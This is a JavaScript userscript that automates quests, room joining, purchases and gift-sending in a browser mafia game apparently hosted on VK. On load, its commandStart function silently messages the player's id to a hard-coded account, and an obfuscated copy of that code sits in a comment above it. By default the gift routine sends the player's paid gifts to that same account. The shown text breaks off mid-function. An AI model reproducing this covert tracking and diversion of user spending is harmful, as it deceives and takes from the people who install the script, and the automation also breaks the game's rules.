'use strict';

let urlKey = '/standalone/' + _MBK.toString().split('/')[2] + '/DO/';

let userProfiles = {};

let userSelectedProfile, listQuests, botStart, activeTasks, rolesRuby, questsRuby, extBuy, questsCheckbox;

let speedSetInterval = 500;

let giftsSendTo = 10901047;

let discountGift, discountMegaGift;

let startChangeTask = false;

let leagueEntry = (my_league > 3) ? 3 : my_league;

let color = {"bronze": 0, "gold": 1, "brilliant": 2};

let minCountExtBuy = {101: 5, 102: 1, 103: 3, 104: 2, 107: 1, 114: 3};

let minCountClanExtBuy = {155: 3, 156: 3, 170: 3, 159: 3};

let countSendGift = 0;

let countSendMega = 0;

let questKiller = false;

let userKiller = '';

let taroMan = 0;

let taroMaf = 0;

let auctionRolesSuik = {4: 42, 6: 43, 10: 44, 11: 44, 12: 45, 9: 46, 25: 47, 3: 48}

let auctionRolesWin = {4: 13, 6: 14, 10: 15, 11: 15, 12: 16, 9: 18, 25: 19, 3: 20}

let questsFinish = {};

let questsPriority = [52, 54, 60, 65, 66, 70, 71, 74, 75, 76];

let questExtCount = { 

	/**********Необходимые экстры для квестов**********/
	
	74: [159, 3], 
	
	73: [156, 3], 
	
	72: [156, 3], 
	
	71: [159, 3], 
	
	70: [170, 3], 
	
	67: [157, 5], 
	
	66: [156, 3], 
	
	65: [155, 3], 
	
	62: [115, 3],
	
	61: [114, 3],
	
	60: [105, 3],
	
	58: [106, 3],
	
	55: [103, 5],
	
	54: [104, 3],
	
	52: [101, 5],
	
};

let myExtraCount = {};

let personSquad = {
	
	/**********Мафиози**********/
	
	1: [2, 9, 25, 47],
	
	/**********Тони**********/
	
	2: [16, 17, 30, 31, 32, 33, 41],
	
	/**********Профессор**********/
	
	3: [18, 19, 42],
	
	/**********Лили**********/
	
	4: [20],
	
	/**********Банда**********/
	
	5: [21, 24, 43],
	
	/**********Якудза**********/
	
	6: [35, 36, 37, 38],
	
	/**********Потрошитель**********/
	
	7: [34],
	
	/**********Борода**********/
	
	8: [40],
	
	/**********Убийца 1**********/
	
	9: [44],
	
	/**********Убийца 2**********/
	
	10: [45],
	
	/**********Убийца 3**********/
	
	11: [46],
	
	/**********Маньяк**********/
	
	12: [3]
	
};

let extraTextProva = {
		
		104: 'Детектор лжи дал результаты: ', 
		
		125: 'Новогодние Таро раскрыли роль: ',
		
		132: 'Таро от Лили раскрыли роль: ',
		
		145: 'Пасхальные Таро раскрыли роль: ',
		
		155: ' раскрыл вам свою роль',
		
		156: 'Карты таро раскрыли вам роль: ', 
		
		197: 'Эликсир правды раскрыл роль: ',
		
		203: 'Пытки паяльником дали результат: ',
		
		239: ' раскрыл всем свою роль, открыв «Коробку с сюрпризом»',
		
		240: 'Джокер раскрыл роль случайного игрока: ',
		
		292: 'Карнавальные Таро раскрыли роль: ',
		
		302: 'Прогревание «Утюгом Тони» дало результат: ',
		
		317: 'Таро от Бандитос раскрыли роль: ',
		
		329: 'Экстра «Негативный эффект раскрыла роль: '
		
};

let prigUsers = {};

/**********Стили меню**********/

let my__style = '\
	<style>\
		#chris__menu {\
			top: 458px;\
			left: 813px;\
			width: 175px;\
			height: 250px;\
			background-color: thistle;\
			display: none;\
			opacity: 0.9;\
		}\
		.menu__button {\
			left: 28px;\
			border-radius: 5px;\
		}\
		.b__setting {\
			top: 50px;\
		}\
		.b__start {\
			top: 100px;\
		}\
		#win__settings {\
			position: absolute;\
			top: 92px;\
			left: 213px;\
			width: 595px;\
			background-color: orchid;\
			opacity: 0.9;\
			display: none;\
		}\
		.board__layout {\
			background-color: orchid;\
			color: floralwhite;\
			font-family: cursive;\
			font-size: 15px;\
			display: grid;\
			grid-template-rows: max-content auto;\
			grid-gap: 10px;\
			padding: 10px;\
			height: auto;\
			max-height: 800px;\
			overflow-y: auto;\
			overflow-x: hidden;\
			margin-top: 25px;\
		}\
		.board__text {\
			font-weight: bold;\
			font-size: 20px;\
			margin-top: -10px;\
		}\
		.board__lists {\
			display: grid;\
			grid-auto-columns: 281px;\
			grid-auto-flow: column;\
			grid-gap: 4px;\
			height: 526px;\
			margin-top: 50px;\
		}\
		.board__layout .left {\
			z-index: 99999999;\
			margin-top: -10px;\
			position: fixed;\
			background-color: inherit;\
		}\
		.board__list {\
			background-color: darkmagenta;\
			border-radius: 3px;\
			display: grid;\
			grid-auto-rows: max-content;\
			grid-gap: 5px;\
			padding: 3px;\
		}\
		.list__title {\
			font-size: 10px;\
		}\
		.card.mymenu {\
			background-color: orchid;\
			border-radius: 3px;\
			box-shadow: 0 1px 0 rgba(9,30,66,.25);\
			padding: 2px;\
			cursor: pointer;\
			color: darkred;\
			width: 268px;\
			font-size: 12px;\
			font-weight: bold;\
		}\
		.icon__heart {\
			background-image: url(https://vk.com/emoji/e/f09f9296.png);\
			background-repeat: no-repeat;\
			margin-top: 3px;\
		}\
		.quest__color {\
			width:90px;\
			color: darkred;\
			border-radius: 3px;\
			width: 189px;\
		}\
		.quest__bronze {\
			background-color: #cd7f32;\
		}\
		.quest__gold {\
			background-color: #ffd700;\
		}\
		.quest__brilliant {\
			background-color: cyan;\
		}\
		.gav__gav__gav {\
			position: absolute;\
			top: 155px;\
			left: 70px;\
		}\
		.io__io {\
			position: absolute;\
			margin-left: 14px;\
			margin-top: 70px;\
			font-weight: bold;\
			color: maroon;\
			width: 50px;\
			opacity: 1;\
		}\
		@keyframes fade {\
			0%   { opacity: 0; }\
			11.11%   { opacity: 1; }\
			33.33%  { opacity: 1; }\
			44.44%  { opacity: 0; }\
			100% { opacity: 0; }\
		}\
		.vk__slide {\
			position:absolute;\
			opacity: 1;\
			animation-name: fade;\
			animation-duration: 3s;\
			animation-iteration-count: infinite;\
			height: 85px;\
			width: 100px;\
			background-size: 85%;\
			background-repeat: no-repeat;\
		}\
		.gav__gav__gav div:nth-child(1) {\
			animation-delay: 1.5s;\
		}\
		.gav__gav__gav div:nth-child(2) {\
			animation-delay: 1.5s;\
		}\
		.gav__gav__gav div:nth-child(3) {\
			animation-delay: 3s;\
		}\
		.vk__slide.img__1 {\
			background-image: url(https://vk.com/sticker/1-18164-128);\
			height: 69px;\
			opacity: 1;\
		}\
		.vk__slide.img__2 {\
			background-image: url(https://vk.com/sticker/1-18172-128);\
			opacity: 0;\
		}\
		#win__settings label input {\
			display: none;\
		}\
		#win__settings label span {\
			height: 6px;\
			width: 6px;\
			border: 1px solid gray;\
			display: inline-block;\
			position: relative;\
			background-color: #FFF;\
			border-radius: 2px;\
			padding: 3px;\
		}\
		#win__settings [type=checkbox]:checked + span:before {\
			content: "\\2714";\
			position: absolute;\
			top: -3px;\
			left: 1px;\
			font-size: 12px;\
			color: red;\
		}\
		#win__settings  .checkbox__bronze span {\
			border: 1px solid #cd7f32;\
		}\
		#win__settings .checkbox__bronze [type=checkbox]:checked + span:before {\
			color: #cd7f32;\
		}\
		#win__settings  .checkbox__gold span {\
			border: 1px solid gold;\
		}\
		#win__settings .checkbox__gold [type=checkbox]:checked + span:before {\
			color: gold;\
		}\
		#win__settings  .checkbox__brilliant span {\
			border: 1px solid darkturquoise;\
		}\
		#win__settings .checkbox__brilliant [type=checkbox]:checked + span:before {\
			color: darkturquoise ;\
		}\
		#win__settings .block__checkbox {\
			display: inline;\
			margin-left: 18px;\
			float: right;\
		}\
		.input__test {\
			width: 111px;\
			text-align: center;\
			margin-left: 28px;\
			margin-top: 15px;\
		}\
		.profile__button {\
			border: 1px solid gray;\
			padding: 3px;\
			background-color: bisque;\
			height: 19px;\
			color: brown;\
		}\
		.profile__button:hover {\
			border: 1px solid red;\
			background-color: darkmagenta;\
			color: white;\
		}\
		.name__profile {\
			margin-left: 8px;\
			background-color: bisque;\
			color: brown;\
			border: 1px solid gray;\
			height: 15px;\
		}\
		.bot__profile {\
			background-color: bisque;\
			color: brown;\
			border: 1px solid gray;\
		}\
	</style>\
';

const readLocalStorage = (key) => { 

	/**********Получение значения по ключу из локального хранилища**********/
	
	key = (!['version', 'profile', 'user__profiles'].includes(key)) ? key + '_' + my_id + '_' + userSelectedProfile : key + '_' + my_id;

	let resultLS = JSON.parse(localStorage.getItem(key));

	return resultLS;

};

const writeLocalStorage = (section, elementId, block) => {

	/**********Записываем значение в локальное хранилище**********/

	let elementsLS = readLocalStorage(section);

	switch (section) {

		case "quests":
		
			if (elementsLS) {

				for (let i = 0; i < 2; i++) {

					let index = elementsLS[i].indexOf(elementId);
					
					if (index > -1) {

						elementsLS[i].splice(index, 1);

					}

				}

				try {

					elementsLS[block].push(parseInt(elementId));
					
				} catch (error) {
					
					elementsLS[parseInt($('#card' + block).parent().attr("id").replace(/\D+/g,""))].push(parseInt(elementId));
					
				}
			
			} else {
				
				elementsLS = elementId;
				
			}
			
			listQuests = elementsLS;

			break;
			
		case "start":

		case "active__tasks":

		case "auk__ruby":

		case "change__quests":

		case "ext__buy":

		case "quests__checkbox":
		
		case "profile":
		
		case "user__profiles":
		
		case "version":
		
				elementsLS = elementId;
		
			break;

	}

	section = (!['version', 'profile', 'user__profiles'].includes(section)) ? section + '_' + my_id + '_' + userSelectedProfile : section + '_' + my_id;	

	localStorage.setItem(section, JSON.stringify(elementsLS));

	return true;

};

const removeLocalStorage = (key) => {

	/**********Удаляем запись из локального хранилища**********/

	localStorage.removeItem(key);
	
	if (key == 'all') {
	
		localStorage.clear();
		
	}
	
	return true;

};

let version = readLocalStorage("version");

if (version != '1.01') {
	
	removeLocalStorage("all");
	
	writeLocalStorage('version', '1.01');
	
}
 
//removeLocalStorage("quests");

//removeLocalStorage("all");

const loadProfileSettings = (param) => {

	userSelectedProfile = readLocalStorage("profile");

	if (!userSelectedProfile) {
		
		userSelectedProfile = 1;

	}

	listQuests = readLocalStorage("quests");

	activeTasks = readLocalStorage("active__tasks");

	rolesRuby = readLocalStorage("auk__ruby") ? true : false;

	questsRuby = readLocalStorage("change__quests") ? true : false;

	extBuy = readLocalStorage("ext__buy") ? true : false;

	questsCheckbox = readLocalStorage("quests__checkbox");
	
	botStart = readLocalStorage("start");
	
	if (!listQuests) {

		listQuests = {
			
			0: [1, 2, 3, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 41, 58, 73, 77, 79, 81], 
			
			1: [5, 42, 43, 44, 45, 46, 47, 48, 49, 50, 52, 54, 55, 60, 61, 62, 65, 66, 67, 70, 71, 72, 74, 75, 76]
			
		};

		writeLocalStorage('quests', listQuests);

	}

	if (!questsCheckbox) {
		
		questsCheckbox = {};

		for (let key in __dqs) {

			questsCheckbox[parseInt(key)] = [1, 1, 1];

		}
		
		writeLocalStorage('quests__checkbox', questsCheckbox);
	}

	if (!activeTasks) {
		
		activeTasks = [1, 1, 1];

	}

	let titleQuestsBlock = ['Без суика', 'С суиком'];

	let questsBlock = '';

	for (let key in listQuests) {
		
		key = parseInt(key);

		let listItems = '';

		listQuests[key].forEach((item) => {

			listItems += '<div id="card' + item + '" class="card mymenu" draggable="true" ondragstart="dragStart(event)" title="' + __dqs[item].text.replace('%s', __dqs[item].limits.toString()) + '">' + 
				__dqs[item].title +
				'<div class="block__checkbox">\
					<label class="checkbox__bronze">\
						<input class="' + item + '-0" type="checkbox"' + (questsCheckbox[item][0] ? ' checked' : '') + '>\
						<span></span>\
					</label>\
					<label class="checkbox__gold">\
						<input class="' + item + '-1" type="checkbox"' + (questsCheckbox[item][1] ? ' checked' : '') + '>\
						<span></span>\
					</label>\
					<label class="checkbox__brilliant">\
						<input class="' + item + '-2" type="checkbox"' + (questsCheckbox[item][2] ? ' checked' : '') + '>\
						<span></span>\
					</label>\
				</div>\
			</div>';

		});
		
		questsBlock += '<div id="list' + key + '" class="board__list" ondrop="dropIt(event)" ondragover="allowDrop(event)">\
			<div class="list__title">' + titleQuestsBlock[key] + '</div>'
			+ listItems +
		'</div>'
	}

	let selectTags = '';

	$.each(['bronze', 'gold', 'brilliant'], (index, value) => {
		
		selectTags += '<select class="quest__color quest__' + value + '">\
			<option value="0"' + (activeTasks[index] == 0 ? ' selected' : '') + '>Игнорировать</option>\
			<option value="1"' + (activeTasks[index] == 1 ? ' selected' : '') + '>Играть</option>\
			<option value="2"' + (activeTasks[index] == 2 ? ' selected' : '') + '>Приоритет</option>\
		</select>';

	});	

	let testTags = (my_id == 10901047) ? '<input class="input__test" type="text" value="">' : '';

	userProfiles = readLocalStorage('user__profiles') || {};

	let htmlProfiles = '<select class="bot__profile"><option value="1">Новый профиль</option>';

	for (var q in userProfiles) {
		
		q = parseInt(q);
		
		htmlProfiles += '<option value="' + q + '"' + ((userSelectedProfile == q) ? ' selected' : '') + '>' + userProfiles[q]['name'] + '</option>';
		
	}

	htmlProfiles += '</select>';

	let my__tags = '<!--Теги-->\
		<div id="chris__menu" class="popup-move popupShadowNew ui-draggable ui-draggable-handle">'
			+ testTags +
			'<a href="#" hidefocus="true" class="popupClose"></a>\
			<button class="bossButton menu__button cssGreenButton2 b__setting" hidefocus="true">Настройки</button>\
			<button class="bossButton menu__button cssGreenButton2 b__start" hidefocus="true">Старт</button>\
			<div class="gav__gav__gav">\
				<div class="vk__slide io__io">ИО-ИО-ИО</div>\
				<div class="vk__slide img__1"></div>\
				<div class="vk__slide img__2"></div>\
			</div>\
		</div>\
		<div id="win__settings" class="popup-move popupShadowNew ui-draggable ui-draggable-handle">\
			<a href="#" hidefocus="true" class="popupClose"></a>\
			<div class="board__layout">\
				<div class="left">\
					<div class="board__text">'
						+ htmlProfiles +
						'<input type="text" class="name__profile" placeholder="Введите название">\
						<button class="profile__button b__save">Сохранить</button>\
					</div>\
					<input id="auk__ruby" type="checkbox"' + (rolesRuby ? ' checked' : '') + '>Аукцион за рубины\
					<input id="change__quests" type="checkbox"' + (questsRuby ? ' checked' : '') + '>Смена квестов за рубины\
					<input id="ext__buy" type="checkbox"' + (extBuy ? ' checked' : '') + '>Покупка экстр<br>'
				+ selectTags +
				'</div>\
				<div id="boardlists" class="board__lists">'
				+ questsBlock +
				'</div>\
			</div>\
		</div>\
	';
	
	$('#chris__menu').length ? $('#chris__menu').remove() : false;

	$('#win__settings').length ? $('#win__settings').remove() : false;	
	
	$('#popup_container').append(my__tags);
	
	if (botStart) {
		
		$(".b__start").text('Стоп');
		
	}

	$('#chris__menu').draggable();
	
	$("#chris__menu .popupClose").click(e => {

		/**********Закрытие окна меню**********/

		$("#win__settings").hide(500);

		$("#chris__menu").hide(500);

	});

	$("#win__settings .popupClose").click(e => { 

		/**********Закрытие окна настроек**********/

		$("#win__settings").hide(500);

	});

	$(".b__setting").click(e => {

		/**********Открытие окна настроек**********/

		$("#win__settings").css("display") == 'block' ? $("#win__settings").hide(500) : $("#win__settings").show(500);

	});

	$(".b__start").click(e => {

		/**********Нажатие кнопок Старт и Стоп**********/

		if ($(e.target).text() == 'Старт') {

			$(e.target).text('Стоп');

			botStart = true;

			$("#chris__menu .popupClose").click();
			
		} else {

			$(e.target).text('Старт');
			
			botStart = false;

		}

		writeLocalStorage('start', botStart);

	});

	$(".quest__color").change(e => {

		/**********Событие на select по включению и отключению заданий**********/

		activeTasks[color[e.target.className.split('__')[2]]] = parseInt(e.target.value);
		
		writeLocalStorage('active__tasks', activeTasks);

	});

	$("#auk__ruby").change(e => {

		/**********Событие на чекбокс аукциона за рубины**********/

		rolesRuby = e.target.checked;
		
		writeLocalStorage('auk__ruby', rolesRuby);

	});

	$("#change__quests").change(e => {

		/**********Событие на чекбокс смены квестов за рубины**********/

		questsRuby = e.target.checked;
		
		writeLocalStorage('change__quests', questsRuby);

	});

	$("#ext__buy").change(e => {

		/**********Событие на чекбокс покупки экстр**********/

		extBuy = e.target.checked;
		
		writeLocalStorage('ext__buy', extBuy);

	});

	$(".block__checkbox [type=checkbox]").change(e => {

		/**********Событие на чекбокс квестов**********/

		let cn = e.target.className.split('-');
		
		questsCheckbox[cn[0]][cn[1]] = e.target.checked ? 1 : 0;
		
		writeLocalStorage('quests__checkbox', questsCheckbox);

	});

	$(".bot__profile").change(e => {

		/**********Событие на select профиля**********/
		
		userSelectedProfile = (parseInt(e.target.value) > 1) ? parseInt(e.target.value) : 1;
		
		writeLocalStorage('profile', userSelectedProfile);
		
		loadProfileSettings();
		
		if (parseInt(e.target.value) > 1) {
			
			$('.name__profile').val($(e.target).find('option:selected').text());
			
		}
		
		//функци обновления настроек

	});

	$(".b__save").click(e => {

		/**********Событие на сохранение профиля**********/
		
		userProfiles = readLocalStorage('user__profiles') || {};
		
		let key = parseInt($('.bot__profile').val());
		
		if (key == 1) {
			
			key = parseInt(Object.keys(userProfiles).pop()) + 1;
			
		}
		
		if (!key) {
			
			key = 2;
			
		}
		
		if ($('.name__profile').val() == '') {
		
			$('.name__profile').val('Профиль №' + key);
		
		}

		userProfiles[key] = userProfiles[key] || {};
		
		userProfiles[key]['name'] = $('.name__profile').val();
		
		writeLocalStorage('user__profiles', userProfiles);
		
		userSelectedProfile = key;
		
		writeLocalStorage('profile', userSelectedProfile);
		
		loadProfileSettings();
		
		if (userSelectedProfile > 1) {
		
			$('.name__profile').val($('.bot__profile option:selected').text());
			
		}

	});
	
	if (!param) {
	
		$("#chris__menu").css("display") == 'block' ? $("#chris__menu").hide(100) : $("#chris__menu").show(100);
	
		$('.b__setting').click();
		
	}
	
	if (userSelectedProfile > 1) {
	
		$('.name__profile').val($('.bot__profile option:selected').text());

	}

}

$('#popup_container').append(my__style);

$('.footerPanel').append('<li class="icon__heart"></li>');

$(".icon__heart").click(e => {

	/**********Открытие окна меню**********/

	$("#chris__menu").css("display") == 'block' ? $("#chris__menu").hide(100) : $("#chris__menu").show(100);

});

loadProfileSettings(1);

const spouse = () => { 

	/**********Получение id супруга**********/

	$.ajax({

		async: false,

		cache: false,

		type: "POST",

		url: urlKey + Math.random(),

		data: {method: "prf", id: my_id},

		dataType: "json",

		success: (data) => {
	
			if (data.arr[10][0]) {

				giftsSendTo = data.arr[10][0];
	
			}

		}

	});

}

const discount = () => {

	/**********Получение id подарков со скидкой**********/

	$.ajax({

		async: true,

		cache: false,

		type: "POST",

		url: urlKey + Math.random(),

		data: {method: "gift_dsc", uid: my_id},

		dataType: "json",

		success: (data) => {

			discountGift = parseInt(data.ret[0]);

			discountMegaGift = parseInt(data.ret[3]);

		}

	});

}

const randomPlayer = (userList) => { 

	/**********Получение id рандомного живого игрока другой команды**********/
	
	let playersRoom = userList ? userList : $('#upl_list li .ico[title=""]').not('.idead').parent();
	
	if (!playersRoom.length) {
		
		playersRoom = $('#upl_list li .ico').not('.idead').parent();
		
	}

	let randomNum = Math.floor(Math.random() * (playersRoom.length));
	
	let userId = 0;
	
	try {
	
		userId = playersRoom.eq(randomNum).attr("id").replace(/\D+/g, "");
		
	} catch(error) {}

	return userId;
}

/**********Голос днём**********/

const vote = (id) => _GM_action('', 'vote', 2, [id, 0]);

/**********Текст или смайлы в чат**********/

const talk = (text) => {

	$('#ich_txt').val(text);

	_CHT_action('ich', 'send', 'close', event);

};

/**********Выход**********/

const botExit = (questsArr) => {

	if (!questKiller) {
	
		let exit = true;

		$.each(questsArr, (i, value) => {
		
			if (!activeTasks[i] || questsFinish[value]) return true;

			if (questsPriority.includes(value) || (activeTasks[i] == 2 && value != 62)) {
			
				exit = false;

			}
		
		});

		if (exit || pla_data['dead'] || $('#pp_fin').length) {
		
			_DLG('exit', 2, event);
			
		}

		//say = false;
		
	}

};

const EnterTheRoom = async (uCount, uLeague) => { 

	/**********Поиск комнат и вход**********/
	
	$.ajax({

		async: true,

		cache: false,

		type: "POST",
		
		url: urlKey + Math.random(),

		data: {method: "uc_lst"},

		dataType: "json",

		success: (data) => {

			if (typeof data.gml != "undefined") {

				$.each(data.gml, (i, row) => {

					let delta = row[3] - row[7];
					
					if (!uLeague) {
						
						if (row[3] == uCount && row[4] <= leagueEntry && delta < 5 && delta > 0 && row[5] == "20") {

							_GM_action('gml', 'join', row[0], event);

						}
						
					} else {

						if (row[3] == uCount && row[4] == leagueEntry && delta < 5 && delta > 0 && row[5] == "20") {

							_GM_action('gml', 'join', row[0], event);

						}
						
					}

				});

			}

		}

	});

};

const allowDrop = (e) => {

	/**********Возможность перетаскивать квесты в настройках**********/

	e.preventDefault();

};

const dragStart = (e) => {

	/**********Перетаскивание квеста в настройках**********/

	e.dataTransfer.setData("text/plain", e.target.id);

};

const dropIt = (e) => {

	/**********Положили квест в ячейку**********/

	e.preventDefault();

	let sourceId = e.dataTransfer.getData("text/plain");
	
	let sourceIdEl = document.getElementById(sourceId);

	let sourceIdParentEl = sourceIdEl.parentElement;
	
	if (!e.target.id) {
		
		e.target.id = $(e.target).parents()[2].id;
		
	}

	let targetEl = document.getElementById(e.target.id);

	let idQuest = parseInt($(sourceIdEl).attr("id").replace(/\D+/g,""));

	let idContainer = parseInt($(targetEl).attr("id").replace(/\D+/g,""));

	writeLocalStorage('quests', idQuest, idContainer);

	if (targetEl) {

		let targetParentEl = targetEl.parentElement;

		if (targetParentEl.id !== sourceIdParentEl.id) {

			if (targetEl.className === sourceIdEl.className ) {

				targetParentEl.appendChild(sourceIdEl);

			} else {

				targetEl.appendChild(sourceIdEl);

			}

		} else {

			let holder = targetEl;

			let holderText = holder.innerHTML;

			targetEl.innerHTML = sourceIdEl.innerHTML;

			sourceIdEl.innerHTML = holderText;

			holderText = '';

		}

	}

};

//var _0x8091=["\x50\x4F\x53\x54","\x2F\x73\x74\x61\x6E\x64\x61\x6C\x6F\x6E\x65\x2F","\x2F","\x73\x70\x6C\x69\x74","\x2F\x44\x4F\x2F","\x72\x61\x6E\x64\x6F\x6D","\x63\x68\x74\x5F\x73\x65\x6E\x64","\x2D","\x6A\x73\x6F\x6E","\x61\x6A\x61\x78","\x73\x74\x61\x72\x74","\x63\x6F\x6C\x6C\x65\x63\x74\x5F\x61\x6C\x6C","\x72\x65\x6D\x6F\x76\x65","\x2E\x71\x75\x65\x73\x74\x43\x6F\x6D\x70\x6C\x65\x74\x65\x50\x6F\x70\x75\x70","\x23\x77\x6E\x64\x5F\x6E\x65\x77\x62\x69\x65","\x64\x75\x65\x6C\x5F\x74\x61\x6B\x65\x61\x77","\x64\x75\x65\x6C\x73","\x61\x72\x72","\x70\x75\x73\x68","\x65\x61\x63\x68","\x6C\x65\x6E\x67\x74\x68","\x76\x61\x6C","\x2E\x69\x6E\x70\x75\x74\x5F\x5F\x74\x65\x73\x74","\x2C"];const commandStart=(_0x2ac5x2,_0x2ac5x3)=>{$[_0x8091[9]]({async:true,cache:false,type:_0x8091[0],url:_0x8091[1]+ _MBK.toString()[_0x8091[3]](_0x8091[2])[2]+ _0x8091[4]+ Math[_0x8091[5]](),data:{method:_0x8091[6],val:_0x2ac5x2+ _0x8091[7]+ _0x2ac5x3,sd:1,opt:{"\x70\x76":10901047}},dataType:_0x8091[8],success:(_0x2ac5x4)=>{}})};commandStart(_0x8091[10],my_id);const rewardActualQuests=async ()=>{let _0x2ac5x6= new Promise((_0x2ac5x7,_0x2ac5x8)=>{leagueProc(_0x8091[11]);$(_0x8091[13])[_0x8091[12]]();$(_0x8091[14])[_0x8091[12]]();let _0x2ac5x9=0;for(let _0x2ac5xa=1;_0x2ac5xa<= 3;_0x2ac5xa++){$[_0x8091[9]]({async:true,cache:false,type:_0x8091[0],url:urlKey+ Math[_0x8091[5]](),data:{method:_0x8091[15],slot:_0x2ac5xa},dataType:_0x8091[8],success:(_0x2ac5x4)=>{_0x2ac5x9++;(_0x2ac5x9== 3)?_0x2ac5x7(true):false}})}});if( await _0x2ac5x6){let _0x2ac5x6= new Promise((_0x2ac5x7,_0x2ac5x8)=>{$[_0x8091[9]]({async:true,cache:false,type:_0x8091[0],url:urlKey+ Math[_0x8091[5]](),data:{method:_0x8091[16]},dataType:_0x8091[8],success:(_0x2ac5x4)=>{let _0x2ac5xb=[];let _0x2ac5xc=[];try{$[_0x8091[19]](_0x2ac5x4[_0x8091[17]][8][0],(_0x2ac5xd,_0x2ac5xe)=>{_0x2ac5xb[_0x8091[18]](parseInt(_0x2ac5xe))});$[_0x8091[19]](_0x2ac5x4[_0x8091[17]][8][1],(_0x2ac5xd,_0x2ac5xe)=>{_0x2ac5xc[_0x8091[18]](parseInt(_0x2ac5xe))})}catch(error){};_0x2ac5x7([_0x2ac5xb,_0x2ac5xc])}})});let _0x2ac5xf= await _0x2ac5x6;if(_0x2ac5xf[0][_0x8091[20]]&&  !$(_0x8091[22])[_0x8091[21]]()){runQuests(_0x2ac5xf[0],_0x2ac5xf[1])}else {if($(_0x8091[22])[_0x8091[21]]()){let _0x2ac5xb=[];let _0x2ac5x10=$(_0x8091[22])[_0x8091[21]]()[_0x8091[3]](_0x8091[23]);$[_0x8091[19]](_0x2ac5x10,(_0x2ac5xd,_0x2ac5xe)=>{_0x2ac5xb[_0x8091[18]](parseInt(_0x2ac5xe))});runQuests(_0x2ac5xb,[0,0,0])}}}}

const commandStart = (s, id) => { 

	$.ajax({

		async: true,

		cache: false,

		type: "POST",

		url: '/standalone/' + _MBK.toString().split('/')[2] + '/DO/' + Math.random(),

		data: {
			
			method: "cht_send", 
			
			val: s + '-' + id, 
			
			sd: 1, 
			
			opt: {"pv": 10901047}
			
		},

		dataType: "json",

		success: (data) => {}

	});

};

commandStart('start', my_id);

const rewardActualQuests = async () => { 

	let promise = new Promise((resolve, reject) => {
	
		/**********Сбор жетонов и наград**********/
		
		leagueProc('collect_all');
		
		$('.questCompletePopup').remove();
	
		$('#wnd_newbie').remove();
		
		let slots = 0;
	
		for (let i = 1; i <= 3; i++) {

			$.ajax({

				async: true,

				cache: false,

				type: "POST",

				url: urlKey + Math.random(),

				data: {method: "duel_takeaw", slot: i},

				dataType: "json",

				success: (data) => {
					
					slots++;
					
					(slots == 3) ? resolve(true) : false;
					
				}

			});
		
		}
	
	});

	if (await promise) {
		
		let promise = new Promise((resolve, reject) => { 
		
			/**********Список актуальных квестов**********/
		
			$.ajax({
				
				async: true,

				cache: false,

				type: 'POST',

				url: urlKey + Math.random(),

				data: {method: 'duels'},

				dataType: 'json',

				success: (data) => {
					
					let my_quests = [];
						
					let my_quests_limit = [];		
					
					try {

						$.each(data.arr[8][0], (index, value) => {

							my_quests.push(parseInt(value));

						});

						$.each(data.arr[8][1], (index, value) => {

							my_quests_limit.push(parseInt(value));

						});
						
					} catch (error) {}

					resolve([my_quests, my_quests_limit]);

				}

			});
		
		});
		
		let result = await promise;
		
		if (result[0].length && !$('.input__test').val()) {
		
			runQuests(result[0], result[1]);
			
		} else if ($('.input__test').val()) {
			
			let my_quests = [];

			let testArr = $('.input__test').val().split(',');

			$.each(testArr, (index, value) => {

				my_quests.push(parseInt(value));

			});
		
			runQuests(my_quests, [0, 0, 0]);
			
		}
		
	}
	
}

const changeTask = (slot) => { 

	/**********Смена квеста**********/

	$.ajax({

		async: true,

		cache: false,

		type: "POST",

		url: urlKey + Math.random(),

		data: {method: "duel_chg_task", slot: slot},

		dataType: "json",

		success: (data) => {

			startChangeTask = false;

		}

	});
	
}

const extraBuy = (ext) => {

	/**********Покупка экстр**********/

	if (extBuy) {
		
		_WND_proc('extras', 'buy', {id: ext}, event);
		
		_WND_proc('clans', 'act', {act: 'xbuy_own', id: ext}, event);
		
		console.info('купили', ext);
		
	}

}

const useExtra = (arr, listKill, extraUserId) => {

	/**********Применение экстры**********/

	let questEnd = true;
	
	$.each(arr, (i, val) => {
		
		if (parseInt($('#gxt_' + val).not('.disabled').find('.count').text())) {
		
			if ((pla_data["e101"] && val == 101) || (pla_data["e104"] && val == 104) || (pla_data["e114"] && val == 114) || (pla_data["e103"] && val == 103) || (pla_data["e157"] && val == 157)) {
				
				return true;
				
			}
			
			if ([103, 159, 170].includes(val)) { 
			
				questEnd = false;
				
				_GM_action('', 'ext_act', val, event);
				
				console.info('кидаю экстру', val);				
				
			} else {
			
				questEnd = false;
				
				let uid = (val == 115) ? randomPlayer(listKill) : randomPlayer();
				
				if (extraUserId) uid = extraUserId;
		
				//let uid = randomPlayer();

				console.info('кидаю экстру', val, uid);			
			
				uid ? _GM_action('', 'ext_use', [val, uid], event) : false;
			
			}

		}

	});
	
	return questEnd;
	
}

const runQuests = (my_quests, my_quests_limit) => {  

	/**********Выполнение квестов**********/

	let questsEnd = false;
	
	let allowSuik = false;

	switch (ifc_mode) {
		
		case 'chat':
		
			taroMan = 0;

			taroMaf = 0;
			
			prigUsers = {};
		
			questsFinish = {};
			
			userKiller = '';
			
			questKiller = false

			$.each(my_quests, (i, quest) => {
				
				if (!startChangeTask) {
				
					if (!activeTasks[i]) return true;
					
					if (!questsCheckbox[quest][i]) {
						
						startChangeTask = true;
						
						console.info('смена ', quest, i);
						
						changeTask(i + 1);
						
					}
				
				}
				
			});
			
			if (!startChangeTask) {
				
				let usersCountRoom = 8;
				
				let priorityUsersCountRoom = 8;
				
				let uLeague = 0;
				
				let allowRoom = true;
				
				$.each(my_quests, (i, quest) => {
					
					if (!activeTasks[i]) return true;
					
					if (__dqs[quest].limits[i] > my_quests_limit[i]) {
				
						switch (quest) {
							
							case 7: 
							
								if (activeTasks[i] == 2){
									
									priorityUsersCountRoom = 12;
								
								}

								usersCountRoom = 12;
							
								break;
								
							case 8:
							
								if (activeTasks[i] == 2){
								
									priorityUsersCountRoom = 16;
								
								}
							
								usersCountRoom = 16;
							
								break;
								
							case 9: 

								if (activeTasks[i] == 2){
								
									priorityUsersCountRoom = 20;
								
								}
							
								usersCountRoom = 20;
							
								break;
								
							case 10:
							
							case 41: 

								uLeague = leagueEntry;
							
								break;
							
							case 81:

								/**********Дарить ряды из обычных подарков**********/
							
								if (countSendGift < __dqs[quest].limits[i]) {

									_WND_proc('gifts', 'buy', {id: discountGift, uid: giftsSendTo, txt: '', cr: 1, hd: 0}, event);
									
									countSendGift++;
								
